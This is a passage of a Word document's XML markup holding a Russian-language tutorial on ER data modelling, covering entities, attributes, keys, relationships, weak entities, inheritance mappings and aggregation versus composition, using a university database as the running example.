        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Шаг 1: Выделение сущностей</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Смотри на задачу и находи </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>существительные</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — кандидаты в сущности.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Пример: «Университет. Студенты учатся на курсах. Преподаватели ведут курсы. Студенты получают оценки.»</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Сущности:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Студент</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Курс</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Преподаватель</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Оценка (или это атрибут? Пока оставим как сущность)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Шаг 2: Определение атрибутов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Для каждой сущности выпиши её </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>свойства</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Студент</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>id (PK)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>фамилия</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>имя</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>отчество</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>дата_рождения</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>номер_зачётки</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>email</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>группа</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Курс</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>id (PK)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>название</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>кредиты (количество зачётных единиц)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>семестр</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Преподаватель</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>id (PK)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>фамилия</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>имя</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>отчество</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>должность (доцент, профессор)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>кафедра</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Оценка</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>студент_id (FK)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>курс_id (FK)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>балл (0-100)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>дата_сдачи</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Шаг 3: Выбор ключей</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Для каждой сущности выбери </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>первичный ключ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (PK).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Правила:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Уникальность (без дубликатов)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Неизменность (не меняется со временем)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Компактность (лучше `INT`, чем `VARCHAR(200)`)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Часто используют </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>суррогатный ключ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — искусственный идентификатор `id`, не имеющий бизнес-смысла.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Альтернатива — </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>естественный ключ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (например, `номер_зачётки`). Но если номера могут измениться или содержать дубликаты — лучше `id`.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Шаг 4: Определение связей</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Смотри на </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>глаголы</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> в описании задачи и определяй связи.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>«Студент **учится на** Курсе» → связь M:N (Студент ↔ Курс)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>«Преподаватель **ведёт** Курс» → связь 1:N (Преподаватель → Курс)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>«Студент **получает** Оценку за Курс» → связь M:N (Студент ↔ Курс), реализуется через таблицу Оценка</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Рисуем связи и указываем кардинальность (1:1, 1:M, M:N).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Шаг 5: Проверка модели</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Задай себе вопросы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Все ли сущности нужны? (Может, какие-то можно объединить?)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Все ли атрибуты на своих местах? (Может, email нужен в отдельной таблице?)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Нет ли избыточности? (Не хранится ли одна и та же информация в двух местах?)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Нет ли аномалий? (Можно ли вставить/удалить/обновить данные без проблем?)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5. Типы атрибутов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>5.1. Простые vs составные</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Простой атрибут</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — неделимый.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Пример: `возраст`, `email`, `город`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Составной атрибут</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — состоит из нескольких частей.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Пример: `ФИО` = `фамилия` + `имя` + `отчество`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Рекомендация: в БД лучше хранить составные атрибуты как несколько простых. Иначе потом будет боль при сортировке по фамилии или поиске по имени.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>5.2. Одиночные vs множественные</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Одиночный атрибут</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — одно значение.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Пример: `дата_рождения` (одна на человека)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Множественный атрибут</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — несколько значений.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Пример: `телефоны` (домашний, мобильный, рабочий)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Проблема: в реляционной БД нельзя хранить массив в одном поле (нарушение 1НФ, первой нормальной формы).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Решение:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Вариант 1: несколько полей (`телефон_1`, `телефон_2`, `телефон_3`) — костыль, не расширяется</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Вариант 2: отдельная таблица `Телефоны` (телефон, тип, владелец_id) — правильно</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>5.3. Обязательные vs необязательные</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Обязательный атрибут</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (NOT NULL) — должен быть заполнен.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Пример: `фамилия`, `дата_рождения`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Необязательный атрибут</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (NULL allowed) — может быть пустым.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Пример: `отчество` (не у всех есть), `email` (можно не указывать)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>5.4. Вычисляемые атрибуты</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вычисляемый атрибут</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — значение выводится из других атрибутов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Пример: `возраст` = текущий год минус `год_рождения`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Рекомендация: не хранить вычисляемые атрибуты в БД (избыточность, риск несоответствия). Вычисляй на лету в запросах или в приложении.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Исключение: если вычисление сложное и используется часто, можно хранить с периодическим пересчётом.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6. Слабые сущности</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Слабая сущность</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — сущность, которая не может существовать без другой сущности (владельца).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Признаки:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Нет собственного первичного ключа (или ключ зависит от владельца)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Удаление владельца удаляет все связанные слабые сущности (каскадное удаление)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Пример: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Комментарий</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> к посту в соцсети.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Комментарий не существует без поста</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Если пост удалён, все комментарии тоже удаляются</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ключ комментария: `(пост_id, комментарий_id)` — составной ключ, включающий FK</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>На диаграмме (Chen): двойной прямоугольник.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>┌────────┐  1    N  ╔═══════════╗</w:t>
        <w:br/>
        <w:t>│  Пост  │──────────║ Комментарий║</w:t>
        <w:br/>
        <w:t>└────────┘          ╚═══════════╝</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>В реальности различие между слабыми и обычными сущностями размыто. Главное — понять зависимость и настроить `ON DELETE CASCADE` в БД.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7. Обобщение и специализация</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Обобщение (generalization)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — выделение общих свойств нескольких сущностей в родительскую сущность.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Специализация (specialization)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — создание подтипов сущности с дополнительными атрибутами.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>наследование</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> в базах данных.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример: Пользователи вуза</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Есть три типа пользователей: Студент, Преподаватель, Администратор.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Общие атрибуты (для всех):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>id</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>фамилия</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>имя</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>email</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>дата_регистрации</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Специфичные атрибуты:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Студент**: номер_зачётки, группа, курс</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Преподаватель**: должность, кафедра, учёная_степень</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Администратор**: права_доступа, отдел</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Способы реализации в БД</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>1. Одна таблица для всех (Single Table Inheritance)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Пользователь (id, фамилия, имя, email, тип, номер_зачётки, группа, должность, кафедра, права_доступа, ...)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Плюсы: простота, один запрос  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Минусы: много NULL-полей, смешение атрибутов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>2. Таблица для каждого подтипа (Class Table Inheritance)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Пользователь (id, фамилия, имя, email, дата_регистрации)</w:t>
        <w:br/>
        <w:t>Студент (id FK, номер_зачётки, группа, курс)</w:t>
        <w:br/>
        <w:t>Преподаватель (id FK, должность, кафедра, учёная_степень)</w:t>
        <w:br/>
        <w:t>Администратор (id FK, права_доступа, отдел)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Плюсы: нормализация, нет лишних NULL  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Минусы: JOIN при выборке, сложнее запросы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>3. Конкретные таблицы (Concrete Table Inheritance)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Студент (id, фамилия, имя, email, номер_зачётки, группа, курс)</w:t>
        <w:br/>
        <w:t>Преподаватель (id, фамилия, имя, email, должность, кафедра)</w:t>
        <w:br/>
        <w:t>Администратор (id, фамилия, имя, email, права_доступа, отдел)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Плюсы: производительность (нет JOIN)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Минусы: дублирование структуры, сложно делать запросы по всем пользователям</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Рекомендация</w:t>
      </w:r>
      <w:r>
        <w:t>: если подтипов мало и они похожи — вариант 1. Если много и сильно различаются — вариант 2.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8. Агрегация и композиция</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Эти концепции пришли из ООП, но применимы и в БД.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Агрегация</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Агрегация</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — отношение «целое-часть», где части могут существовать независимо.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Пример: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Университет</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> содержит </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Факультеты</w:t>
      </w:r>
      <w:r>
        <w:t>. Факультет может существовать и без университета (теоретически).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>На диаграмме UML: пустой ромбик.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Композиция</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Композиция</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — отношение «целое-часть», где части </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>не могут</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> существовать без целого.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Пример: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Заказ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> содержит </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Позиции заказа</w:t>
      </w:r>
      <w:r>
        <w:t>. Позиция заказа не имеет смысла без заказа.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>На диаграмме UML: закрашенный ромбик.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реализация в БД</w:t>
      </w:r>
      <w:r>
        <w:t>: композиция часто реализуется через `ON DELETE CASCADE` — при удалении заказа автоматически удаляются все его позиции.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9. Примеры ER-диаграмм</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 1: Интернет-магазин</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сущности</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пользователь</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
